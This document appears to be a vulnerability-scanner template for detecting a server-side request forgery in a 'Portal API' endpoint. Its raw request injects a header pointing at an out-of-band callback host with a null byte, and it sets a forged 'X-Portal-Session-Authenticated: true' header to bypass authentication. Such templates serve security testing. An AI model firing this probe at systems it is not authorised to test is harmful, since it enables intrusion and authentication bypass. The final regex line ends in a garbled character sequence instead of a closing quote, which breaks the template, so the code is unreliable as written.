id: portal-api-ssrf

info:
  name: Portal API SSRF Vulnerability
  author: tess
  severity: medium
  description: Detects potential Server-Side Request Forgery (SSRF) vulnerability in the Portal API endpoint by injecting a crafted X-Portal-Context-Origin header.
  reference:
    - https://owasp.org/www-community/attacks/Server_Side_Request_Forgery
  tags: ssrf, api, vulnerabilities

http:
  - raw:
      - |+
        GET /_proxy/api/v3/portal HTTP/2
        Host: {{Hostname}}
        X-Portal-Context-Origin: HttP://{{interactsh-url}}?%00
        X-Portal-Session-Authenticated: true
        Accept-Encoding: gzip,deflate,br
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
        Content-Length: 0

    matchers:
      - type: dsl
        dsl:
          - "interactsh_protocol == 'http'"
        condition: and

    extractors:
      - type: regex
        name: interaction_id
        part: interactsh
        regex:
          - "[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}‚Äù

